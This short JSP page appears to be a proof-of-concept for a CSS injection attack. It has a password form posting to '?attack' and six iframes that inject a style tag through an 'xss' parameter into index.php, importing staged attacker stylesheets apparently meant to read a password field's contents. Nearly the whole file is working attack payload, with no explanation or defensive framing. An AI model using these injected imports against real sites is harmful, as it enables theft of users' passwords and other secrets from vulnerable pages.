<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>
<html>
<head>
    <title>Start</title>
</head>
<body>
<form method=POST action=?attack>
    Enter something here and press enter <input name="pass" type="password" maxlength=11 value=""/>
    <p/><p/><p/>
</form>


<iframe src="?read" height="100%" frameborder=0 width="100%"></iframe>
<iframe frameborder=0 src="index.php?xss=<style>@import %22index.php?css=0%26d=reading%261359639071%22%3B</style>"/></iframe>
<iframe frameborder=0 src="index.php?xss=<style>@import %22index.php?css=1%26d=reading%261359639071%22%3B</style>"/></iframe>
<iframe frameborder=0 src="index.php?xss=<style>@import %22index.php?css=2%26d=reading%261359639071%22%3B</style>"/></iframe>
<iframe frameborder=0 src="index.php?xss=<style>@import %22index.php?css=3%26d=reading%261359639071%22%3B</style>"/></iframe>
<iframe frameborder=0 src="index.php?xss=<style>@import %22index.php?css=4%26d=reading%261359639071%22%3B</style>"/></iframe>
<iframe frameborder=0 src="index.php?xss=<style>@import %22index.php?css=5%26d=reading%261359639071%22%3B</style>"/></iframe>

</body>
</html>

